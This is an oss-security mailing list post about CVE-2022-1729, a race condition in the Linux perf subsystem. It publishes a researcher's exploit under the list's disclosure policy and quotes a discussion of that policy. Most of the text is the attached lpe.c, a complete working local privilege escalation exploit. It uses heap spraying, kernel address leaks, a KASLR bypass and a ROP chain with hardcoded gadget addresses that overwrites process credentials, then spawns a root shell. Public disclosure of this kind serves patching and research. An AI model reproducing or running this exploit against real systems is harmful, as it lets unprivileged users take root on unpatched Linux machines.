Received: (qmail 17469 invoked by uid 550); 30 Jun 2022 09:13:16 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 16028 invoked from network); 30 Jun 2022 09:12:15 -0000
Date: Thu, 30 Jun 2022 11:12:10 +0200
From: Solar Designer <solar@openwall.com>
To: Norbert Slusarek <nslusarek@gmx.net>
Cc: oss-security@lists.openwall.com, peterz@infradead.org
Message-ID: <20220630091210.GA3060@openwall.com>
References: <trinity-5f3c0fdf-d83f-422e-9a05-c4ead66e42e1-1653077676864@3c-app-gmx-bap52> <20220521154759.GA15268@openwall.com> <trinity-4c518dcc-751b-4893-82dc-b2f80734eb9d-1653430844824@3c-app-gmx-bap13> <20220524232155.GA2264@openwall.com> <trinity-3f5f7066-5ba5-45cb-b229-a2207e9fe209-1653583477988@3c-app-gmx-bap49> <20220526173546.GA8848@openwall.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="YZ5djTAD1cGYuMQK"
Content-Disposition: inline
In-Reply-To: <20220526173546.GA8848@openwall.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] CVE-2022-1729: race condition in Linux perf subsystem leads to local privilege escalation

--YZ5djTAD1cGYuMQK
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi all,

I'm attaching Norbert's exploit (lpe.c) that was attached to his May 12
notification to linux-distros.  We're now one month past the due date
for Norbert's expected posting of this (should have been May 27, which
is 7 days after public disclosure of the vulnerability on oss-security).

Norbert, I would still appreciate a reply to the message below.  I'm
quoting it in full for context since it's been a month.

Thanks,

Alexander

On Thu, May 26, 2022 at 07:35:46PM +0200, Solar Designer wrote:
> 
> Thank you for engaging in this discussion.  It helps.
> 
> On Thu, May 26, 2022 at 06:44:38PM +0200, Norbert Slusarek wrote:
> > >What do you suggest we do regarding the LPE exploit you sent to
> > >linux-distros?
> > 
> > I saw your reveal of linux-distros from 2020 and the exchange
> > didn't include any text nor attachments. In that case, the
> > exploit should remain private to linux-distros accordingly.
> 
> I don't know what "reveal of linux-distros from 2020" you refer to.  The
> policy aspect in question (see below) is in effect since 2017, and I
> don't recall us deviating from it.  Did we?
> 
> We have a published policy here:
> 
> https://oss-security.openwall.org/wiki/mailing-lists/distros#list-policy-and-instructions-for-reporters
> 
> which includes:
> 
> "If you shared exploit(s) that are not an essential part of the issue
> description, then at your option you may slightly delay posting them to
> oss-security but you must post the exploits to oss-security within at
> most 7 days of making the mandatory posting above.  If you exercise this
> option, you have two mandatory postings to make: first with a
> sufficiently detailed issue description (as requested above) and with an
> announcement of your intent to post the exploits separately (please
> mention exactly when), and second with the exploits - or indeed you
> could have included the exploits right away, in your first and only
> mandatory posting."
> 
> Did you read this before posting?  If not, anything we should have done
> to ensure you'd have read it?
> 
> > >What do you suggest we do with this policy aspect going forward, so that
> > >people do not get into a situation where they're required to do
> > >something they didn't want to subscribe to?
> > 
> > How is this policy aspect enforced in the first place?
> > If it's not, I suggest you remove it entirely as there is no reason
> > to have policies which cannot (and shouldn't) be enforced.
> 
> Reminders, like I am doing now (often in private, this time in public).
> Failing that, list members technically can post the exploits themselves.
> Finally, we can setup the list to automatically make all messages public
> with a delay.
> 
> However, as you can see from another recent thread we're now in the
> process of reconsidering list policy aspects, so might end up e.g.
> extending the period from 7 to 30 days.  Would that work for you?
> 
> If people insist on keeping exploits sent to (linux-)distros private
> forever, then I'll more likely either shut down the list instead or set
> it up to automatically make all messages public.  After all, if people
> send private messages to some list without reading its published policy
> first, they accept that anything can happen with those messages.  Right?
> Yet I've been reluctant to do that so far, as it's not ideal for social
> and technical reasons.
> 
> > Overall, as a researcher I would prefer having a way just to inform
> > distros of a bug, *without* being subject to these requirements.
> 
> I understand, yet I find that very problematic.
> 
> Also, you don't need to post an exploit (especially more than a PoC) to
> the list "to inform distros of a bug".  You can literally just inform
> them, and (if you don't accept the policy on forced publication of what
> you share with the list) offer to privately share the exploit with
> interested distros.  Then the exploit itself wouldn't be subject to the
> forced publication.
> 
> Thanks again,
> 
> Alexander

--YZ5djTAD1cGYuMQK
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="lpe.c"

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <byteswap.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <linux/perf_event.h>
#include <linux/keyctl.h>

#define KEY_BUFSIZE 1010
#define MSG_BUFSIZE 1032
#define MSG_OFFSET 48
#define KEY_OFFSET 24
#define KERNEL_TEXT 0xffffffff81000000

/* used to wait for kernel workers which free structures */
#define WAIT_KWORKER(x)									\
	do {												\
		for (int counter = 0; counter < x; counter++) { \
			usleep(50);									\
		}												\
	} while(0)

struct msg_msg {
	long mtype;
	char mtext[MSG_BUFSIZE];
};

static long key[10];
static int msqid;

struct thread_common {
	int ev_trace;
	int ev_hard;
	int ev_soft;
	pid_t pid;
	pthread_barrier_t barrier;
};

void die(char *s)
{
	perror(s);
	exit(EXIT_FAILURE);
}

void do_msg_spray(int msq, struct msg_msg *msg, int from, int to)
{
	for (msg->mtype = from; msg->mtype <= to; msg->mtype++) {
		if (msgsnd(msqid, msg, sizeof(msg->mtext), 0) != 0)
			die("failed msgsnd");
	}
}

void *setup_trace(void *arg)
{
	struct perf_event_attr attr;
	cpu_set_t set;
	pthread_t tid;
	struct thread_common *tc = (struct thread_common *)arg;

	CPU_ZERO(&set);
	CPU_SET(1, &set);

	tid = pthread_self();
	if (pthread_setaffinity_np(tid, sizeof(set), &set) != 0)
		die("failed pthread_setaffinity_np");

	WAIT_KWORKER(1);

	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_TRACEPOINT;
	attr.config = 0xc6;
	attr.exclude_kernel = 1;
	attr.exclude_hv = 1;

	tc->ev_trace = syscall(__NR_perf_event_open, &attr, tc->pid, -1, -1, 0);

	return NULL;
}

void *thr_hard(void *arg)
{
	struct perf_event_attr attr;
	cpu_set_t set;
	pthread_t tid;
	struct thread_common *tc = (struct thread_common *)arg;

	CPU_ZERO(&set);
	CPU_SET(1, &set);

	tid = pthread_self();
	if (pthread_setaffinity_np(tid, sizeof(set), &set) != 0)
		die("failed pthread_setaffinity_np");

	WAIT_KWORKER(1);

	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_HARDWARE;
	attr.exclude_kernel = 1;
	attr.exclude_hv = 1;

	pthread_barrier_wait(&tc->barrier);

	tc->ev_hard = syscall(__NR_perf_event_open, &attr, tc->pid, -1, tc->ev_trace, 0);

	return NULL;
}

void *thr_soft(void *arg)
{
	struct perf_event_attr attr;
	cpu_set_t set;
	pthread_t tid;
	struct sched_param param = {.sched_priority = 0};
	struct thread_common *tc = (struct thread_common *)arg;

	CPU_ZERO(&set);
	CPU_SET(0, &set);

	/* set SCHED_IDLE so the soft event thread will acquire
	 * the ctx mutex *after* the hard event thread will
	 */
	tid = pthread_self();
	if (pthread_setschedparam(tid, SCHED_IDLE, &param) != 0)
		die("failed pthread_setschedparam");

	if (pthread_setaffinity_np(tid, sizeof(set), &set) != 0)
		die("failed pthread_setaffinity_np");

	WAIT_KWORKER(1);

	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_SOFTWARE;
	attr.exclude_kernel = 1;
	attr.exclude_hv = 1;

	pthread_barrier_wait(&tc->barrier);

	tc->ev_soft = syscall(__NR_perf_event_open, &attr, tc->pid, -1, tc->ev_trace, 0);

	return NULL;
}

uint64_t get_leaked_kmalloc_addr(char *buf, size_t len)
{
	uint64_t node_addr = 0;
	unsigned char c;
	int i;

	for (i = 0; i < len; i++) {
		c = buf[i] & 0xff;
		if (c == 0x41) {
			/* the leaked address should be right before group_index (which is 0x41...) */
			node_addr = *((uint64_t *)&buf[i-8]);
			break;
		}
	}

	return node_addr;
}

int hard_event_alone(int onpid)
{
	struct perf_event_attr attr;
	int ev;

	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_HARDWARE;
	attr.exclude_kernel = 1;
	attr.exclude_hv = 1;

	/* the group argument is -1, which means it's run independently */
	ev = syscall(__NR_perf_event_open, &attr, onpid, -1, -1, 0);

	return ev;
}

void run_race(struct thread_common *tc)
{
	pthread_t th[4];

	pthread_create(&th[3], 0, setup_trace, tc);

	pthread_join(th[3], 0);

	usleep(50000);

	/* these two threads race against each other */
	pthread_create(&th[1], 0, thr_hard, tc);
	pthread_create(&th[2], 0, thr_soft, tc);

	pthread_barrier_wait(&tc->barrier);

	pthread_join(th[1], 0);
	pthread_join(th[2], 0);
}

int get_kmalloc2k_infoleak(uint64_t *addr, struct msg_msg *msgp, pid_t pid_fork)
{
	struct msg_msg msg;

	memset(&msg, 0, sizeof(msg));

	uint64_t src;
	/* we want to bail out asap, for this the parent node must be black (lsb = 1)  */
	src = 1;
	/* __rb_parent_color is at offset 48, subtract MSG_OFFSET = 0 */
	memcpy(msg.mtext, &src, 8);
	/* group_index */
	src = 0x4141414141414141;
	memcpy(&msg.mtext[72 - MSG_OFFSET], &src, 8);

	struct thread_common tc;

	if (!pid_fork) {
		pid_fork = fork();
		if (pid_fork == 0) {
			sleep(999999999);
			exit(EXIT_SUCCESS);
		}
	}

	memset(&tc, 0, sizeof(tc));
	tc.pid = pid_fork;
	pthread_barrier_init(&tc.barrier, NULL, 3);

	run_race(&tc);

	int ev_trace = tc.ev_trace;
	int ev_hard = tc.ev_hard;
	int ev_soft = tc.ev_soft;

	sleep(1);

	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		die("failed sched_setaffinity");

	close(ev_trace);
	close(ev_hard);
	close(ev_soft);

	WAIT_KWORKER(500);

	do_msg_spray(msqid, &msg, 1, 10);

	sleep(1);

	int ev = hard_event_alone(pid_fork);
	sleep(1);

	char *readbuf = malloc(0x1000);
	if (readbuf == NULL)
		die("[-] failed malloc of read buffer");

	memset(readbuf, 0, 0x1000);

	uint64_t node_addr = 0;
	int found = 0;

	for (int mtype = 1; mtype <= 10; mtype++) {
		memset(readbuf, 0, sizeof(readbuf));
		msgrcv(msqid, readbuf, MSG_BUFSIZE, mtype, 0);

		if (!found) {
			node_addr = get_leaked_kmalloc_addr(readbuf, MSG_BUFSIZE);
			if (node_addr != 0) {
				found = 1;
			}
		}
	}

	if (node_addr == 0) {
		printf("[~] no infoleak, might retry race\n");
		free(readbuf);
		return 0;
	} else {
		node_addr -= 0x30; /* node_addr - struct rb_node offset = node_addr beginning */
		printf("[+] won the race! kmalloc node addr = %lx\n", node_addr);
	}

	*addr = node_addr;
	free(readbuf);

	return ev;
}

uint64_t get_kaslr_infoleak(char *buf, size_t buflen)
{
	size_t len = 0;
	int mul = 0x1000;
	uint64_t min_addr = 0;
	uint64_t addr;
	int found_first = 0;

	/* round off to multiple */
	while ((len + mul) <= buflen) {
		len += mul;
	}

	for (int i = 0; i < len; i += 8) {
		addr = *((uint64_t *)&buf[i]);
		if (addr > KERNEL_TEXT && addr < 0xffffffffff000000 &&
			((addr & 0xf) == 0)) {	/* address should be aligned */

			if (!found_first) {
				/* if no text address was found yet, take this as the minimum address */
				min_addr = addr;
				found_first = 1;
			} else {
				if (addr < min_addr)
					min_addr = addr;
			}
		}
	}

	return min_addr;
}

void do_key_spray(char *keybuf, size_t keylen, int keynum)
{
	char desc[32];

	for (int i = 0; i < keynum; i++) {
		memset(desc, 0, sizeof(desc));
		snprintf(desc, sizeof(desc), "desc-%d", i);
		key[i] = syscall(__NR_add_key, "user", desc, keybuf, keylen,
									KEY_SPEC_SESSION_KEYRING);
		if (key[i] == -1)
			die("[-] add_key failed");
	}

}

void stage_one(char *keybuf, size_t keylen, int keynum, uint64_t *addr)
{
	int ev_tmp;
	uint64_t node_addr;

	printf("[+] running stage 1\n");

	for (int i = 0; i < 5; i++) {
		ev_tmp = get_kmalloc2k_infoleak(&node_addr, NULL, 0);
		if (ev_tmp > 0)
			break;
	}

	if (ev_tmp < 0) {
		printf("[-] stage 1: tried 5 times to get address of node\n");
		exit(EXIT_FAILURE);
	}

	/* in stage two, a write to gparent_parent->rb_right (gparent_parent + 8)
	 * will be carried out, which means that the sprayed user_key_payload
	 * structure at node_addr will have its datalen field (offset 16) overwritten.
	 */
	uint64_t gparent_parent = node_addr + 0x8;
	memcpy(keybuf + 0x30 - KEY_OFFSET, &gparent_parent, 8);

	close(ev_tmp);

	WAIT_KWORKER(100);

	do_key_spray(keybuf, KEY_BUFSIZE, 10);

	*addr = node_addr;

	printf("[+] stage 1: done\n");
	sleep(1);
}

uint64_t stage_two(uint64_t node_addr, uint64_t *kaslr_offset)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set);

	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		die("[-] failed sched_setaffinity for run");

	WAIT_KWORKER(1);

	/* prepare parent buffer */

	struct msg_msg msg;
	memset(&msg, 0, sizeof(msg));

	uint64_t gparent = node_addr + 0x30;
	memcpy(msg.mtext, &gparent, 8);
	uint64_t parent_rb_right = node_addr + 0x60;
	memcpy(&msg.mtext[8], &parent_rb_right, 8);

	/* group_index */
	uint64_t group_index = 0x4141414141414141;
	memcpy(&msg.mtext[72 - MSG_OFFSET], &group_index, 8);

	/* group_index of parent is set to a high value so the new node
	 * added to the rb tree definitely becomes the left node of parent
	 * (parent->group_index > node->group_index)
	 */

	struct thread_common tc;

	pid_t pid_fork = fork();
	if (pid_fork == 0) {
		sleep(999999999);
		exit(EXIT_SUCCESS);
	}

	memset(&tc, 0, sizeof(tc));
	tc.pid = pid_fork;
	pthread_barrier_init(&tc.barrier, NULL, 3);

	run_race(&tc);

	int ev_trace, ev_hard, ev_soft;
	ev_trace = tc.ev_trace;
	ev_hard = tc.ev_hard;
	ev_soft = tc.ev_soft;

	sleep(1);

	close(ev_trace);
	close(ev_hard);
	close(ev_soft);

	WAIT_KWORKER(500);

	do_msg_spray(msqid, &msg, 1, 10);

	printf("[+] stage 2: sprayed cache!\n");
	sleep(1);

	/* creating this event will trigger the datalen overwrite in rb tree code */
	hard_event_alone(pid_fork);
	sleep(1);

	printf("[+] user_key_payload datalen corrupted, attempt to read keys\n");

	char *readbuf = malloc(0xffff);
	if (readbuf == NULL)
		die("[-] failed malloc for readbuf");

	memset(readbuf, 0, sizeof(*readbuf));

	int keynr = -1;
	int keybytes;

	for (int i = 0; i < 10; i++) {
		keybytes = syscall(__NR_keyctl, KEYCTL_READ, key[i], readbuf, 1);
		if (keybytes > KEY_BUFSIZE) {
			keynr = i;
			break;
		}
	}

	if (keynr == -1) {
		printf("[-] stage 2: could not find a corrupted key buffer\n");

		free(readbuf);

		for (int i = 0; i < 10; i++) {
			if (i == keynr)
				continue;
			syscall(__NR_keyctl, KEYCTL_INVALIDATE, key[i]);
		}
		return 0;
	}

	/* free buffers */
	for (int i = 0; i < 10; i++) {
		if (i == keynr)
			continue;
		syscall(__NR_keyctl, KEYCTL_INVALIDATE, key[i]);
	}

	for (msg.mtype = 1; msg.mtype <= 10; msg.mtype++) {
		if (msgrcv(msqid, msg.mtext, sizeof(msg.mtext), msg.mtype, 0) < 0)
			die("[-] failed msgrcv\n");
	}

	WAIT_KWORKER(10000);

	/* spray with netlink sockets to fill cache with text addresses */
	int sock[512];
	for (int i = 0; i < 512; i++) {
		sock[i] = socket(AF_NETLINK, SOCK_DGRAM, 0);
	}

	int ret = syscall(__NR_keyctl, KEYCTL_READ, key[keynr], readbuf, keybytes);
	if (ret < 0)
		die("[-] failed keyctl KEYCTL_READ\n");

	uint64_t text_addr = get_kaslr_infoleak(readbuf, ret);
	if (text_addr == 0) {
		printf("[~] stage 2: failed to retrieve kernel text address\n");
		for (int i = 0; i < 512; i++) {
			close(sock[i]);
		}
		free(readbuf);
		return 0;
	}

	printf("[+] stage 2: leaked kernel text address = %lx\n", text_addr);

	text_addr &= ~(0xffffff);

	uint64_t offset = text_addr - KERNEL_TEXT;
	printf("[+] stage 2: done, kaslr offset = %lx\n", offset);

	*kaslr_offset = offset;

	return 1;
}

/* taken from crusaders of rust exploit */
void pwn()
{
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    _exit(0);
}

void clear_msg_queue(void)
{
	char buf[MSG_BUFSIZE];

	for (int i = 0; i < 20; i++) {
		msgrcv(msqid, buf, sizeof(buf), i, IPC_NOWAIT);
	}
}

void stage_three(uint64_t kaslr_offset)
{
	char keybuf[KEY_BUFSIZE];
	struct msg_msg msg;
	uint64_t rop_location;
	int ev_rop;

	printf("[+] running stage 3\n");

	/* clear the msg queue just in case */
	clear_msg_queue();

	memset(&msg, 0, sizeof(msg));
	memset(keybuf, 0, sizeof(keybuf));

	/* prepare rop object */

	pid_t pid_fork = fork();
	if (pid_fork == 0) {
		sleep(999999999);
		exit(EXIT_SUCCESS);
	}

	for (int i = 0; i < 5; i++) {
		ev_rop = get_kmalloc2k_infoleak(&rop_location, NULL, 0);
		if (ev_rop > 0)
			break;
	}

	if (ev_rop < 0) {
		printf("[-] stage 3: tried 5 times to get address for rop place\n");
		exit(EXIT_FAILURE);
	}


	/* rop_location is the address of the msg containing the rop chains and
	 * dereferenced pointers.
	 */
	printf("[+] stage 3: rop object addr = %lx\n", rop_location);

	uint64_t stack_pivot = 0xffffffff8106eda9 + kaslr_offset; /* mov rax, rsp ; pop rbp ; ret */
	uint64_t mov_rax_r8_pop = 0xffffffff810dcf03 + kaslr_offset;
	uint64_t add_rax_rcx_pop = 0xffffffff810c1379 + kaslr_offset;
	uint64_t store_rcx_into_rax_pop = 0xffffffff817cee6f + kaslr_offset;
	uint64_t pop_rdi = 0xffffffff81076990 + kaslr_offset;
	uint64_t find_task_by_vpid = 0xffffffff810a80d0 + kaslr_offset;
	uint64_t mov_rdi_rax_jne_pop = 0xffffffff81602b3e + kaslr_offset;
	uint64_t xor_r15d_r15d = 0xffffffff8105c0dc + kaslr_offset;
	uint64_t pop_rsi = 0xffffffff810690d6 + kaslr_offset;
	uint64_t init_nsproxy = 0xffffffff826574f0 + kaslr_offset;
	uint64_t switch_task_namespaces = 0xffffffff810b02c0 + kaslr_offset;
	uint64_t load_rax_from_rax_pop = 0xffffffff81107643 + kaslr_offset;
	uint64_t store_zero_into_dword_rax_pop = 0xffffffff81044949 + kaslr_offset;
	uint64_t add_rax_16_pop = 0xffffffff8119674c + kaslr_offset;
	uint64_t pop_rcx = 0xffffffff810128ef + kaslr_offset;
	uint64_t ret_0x128 = 0xffffffff81506062 + kaslr_offset;
	uint64_t ret = 0xffffffff810001ec + kaslr_offset;
	uint64_t xchg_rax_r13 = 0xffffffff81982631 + kaslr_offset;

	uint64_t ownpid = getpid();

	uint64_t rop_chain[] = {
		mov_rax_r8_pop,
		0xdeadbeef,
		pop_rcx,
		168,
		add_rax_rcx_pop,
		0xdeadbeef,
		pop_rcx,
		0xffffffff,
		store_rcx_into_rax_pop,
		0xdeadbeef,
		/* until here, PERF_EVENT_STATE_OFF = -1 was written into event->state
		 * to prevent another run.
		 */
		pop_rdi,
		ownpid,
		find_task_by_vpid,
		xor_r15d_r15d,
		mov_rdi_rax_jne_pop,
		0xdeadbeef,
		pop_rsi,
		init_nsproxy,
		switch_task_namespaces,
		/* until here, the user namespace was switched to root namespace */
        pop_rdi,
		ownpid,
		find_task_by_vpid,
		pop_rcx,
		1720,
		add_rax_rcx_pop,
		0xdeadbeef,
		load_rax_from_rax_pop,
		0xdeadbeef,
		pop_rcx,
		20,
		add_rax_rcx_pop,
		0xdeadbeef,
		store_zero_into_dword_rax_pop,
		0xdeadbeef,
		add_rax_16_pop,
		0xdeadbeef,
		store_zero_into_dword_rax_pop,
		0xdeadbeef,
		/* until here, task was found by pid, then task->cred located
		 * and its uid and euid overwritten with 0.
		 */
		xchg_rax_r13,
		pop_rcx,
		0x48,				/* location of $rbp */
		add_rax_rcx_pop,
		0xdeadbeef,
		stack_pivot
    };

	/* ctx->pmu is dereferenced at offset 0x60 */
	uint64_t ctx_pmu = rop_location + 0x80;
	memcpy(&msg.mtext[0x60 - MSG_OFFSET], &ctx_pmu, 8);

 	/* dummy value, works because it's only fetched but not used */
	uint64_t pmu_cpu_context = rop_location;
	memcpy(&msg.mtext[0x80 - MSG_OFFSET], &pmu_cpu_context, 8);

	/* stack pivot gadget at pmu->filter_match (0x100 + 280) */
	memcpy(&msg.mtext[0x100 + 280 - MSG_OFFSET], &stack_pivot, 8);

	memcpy(&msg.mtext[0x108 - MSG_OFFSET], &ret_0x128, sizeof(ret_0x128));
	memcpy(&msg.mtext[0x110 - MSG_OFFSET], &ret, sizeof(ret));

    memcpy(&msg.mtext[0x100 + 0x140 - MSG_OFFSET], rop_chain, sizeof(rop_chain));

	printf("[+] stage 3: closing rop event and spraying\n");
	close(ev_rop);

	WAIT_KWORKER(100);

	do_msg_spray(msqid, &msg, 1, 10);

	printf("[+] stage 3: rop event sprayed\n");
	sleep(1);

	/* set rb nodes for leak of smuggled event */

	/* black parent */
	uint64_t src = 1;
	/* __rb_parent_color is at offset 48, subtract MSG_OFFSET = 0 */
	memcpy(&keybuf[48 - KEY_OFFSET], &src, 8);

	/* group_index */
	src = 0x4141414141414141;
	memcpy(&keybuf[72 - KEY_OFFSET], &src, 8);

	/* event->ctx->pmu; location of fake ctx at offset 0x520 */
	uint64_t ctx = rop_location + 0x60;
	memcpy(&keybuf[544 - KEY_OFFSET], &ctx, 8);

	int event_state = 1;
	memcpy(&keybuf[168 - KEY_OFFSET], &event_state, 4);

	int cpu = -1;
	memcpy(&keybuf[660 - KEY_OFFSET], &cpu, 4);

	uint64_t event_pmu = rop_location + 0x100;
	memcpy(&keybuf[152 - KEY_OFFSET], &event_pmu, 8);

	/* this event will be killed to trigger merge_sched_in */
	hard_event_alone(pid_fork);

	printf("[+] trigger final race\n");

	struct thread_common tc;
	memset(&tc, 0, sizeof(tc));

	tc.pid = pid_fork;
	pthread_barrier_init(&tc.barrier, 0, 3);

	run_race(&tc);

	printf("[~] stage 3: race done\n");
	sleep(1);

	close(tc.ev_trace);
	close(tc.ev_hard);
	close(tc.ev_soft);

	WAIT_KWORKER(100);

	do_key_spray(keybuf, KEY_BUFSIZE, 10);
	printf("[+] stage 3: sprayed with keys\n");

	WAIT_KWORKER(500);

	printf("[+] stage 3 kill fork to trigger rop chain\n");
	sleep(1);

	if (fork() == 0) {
		kill(pid_fork, SIGKILL);
		exit(EXIT_SUCCESS);
	}

	sleep(3);

	/* check for root permissions */
	printf("[~] stage 3: spawning bash, check root permissions.\n");
	pwn();

	printf("[-] stage 3: couldn't escalate to root.\n");
	exit(EXIT_FAILURE);
}

int main(void)
{
	uint64_t node_addr;
	uint64_t kaslr_offset = 0;

	msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
	if (msqid < 0)
		die("failed to get msqid");

	/* key and msg are spray primitives */
	memset(key, 0, sizeof(key));
	char keybuf[KEY_BUFSIZE];
	memset(keybuf, 0, KEY_BUFSIZE);

	/* stage one: get a kmalloc-2k infoleak needed
	 * for stage two.
	 */
	stage_one(keybuf, KEY_BUFSIZE, 10, &node_addr);

	/* stage two: use leaked address from stage one to
	 * construct fake rb nodes (one being the infoleak from stage one)
	 * and corrupt datalen of user_key_payload.
	 * once corrupted, OOB read is performed and kernel text addresses
	 * leaked in order to defeat KASLR.
	 * this stage can be unstable, so if it didn't success, rerun the exploit.
	 */

	if (!stage_two(node_addr, &kaslr_offset)) {
		printf("[-] stage 2: failed, rerun exploit.\n");
		exit(EXIT_FAILURE);
	}

	/* stage three:
	 * - the chain is allocated at rop_location in place of the leaked perf event object.
	 * -  use the retrieved KASLR offset from stage two to adjust the rop chain.
	 * - run the arbitrary execution by killing the forked process,
	 * - which leads to a schedule in function being called for the UAF perf software event.
	 */
	stage_three(kaslr_offset);

	/* if stage_three didn't work, rerun the exploit */

	return 0;
}

--YZ5djTAD1cGYuMQK--
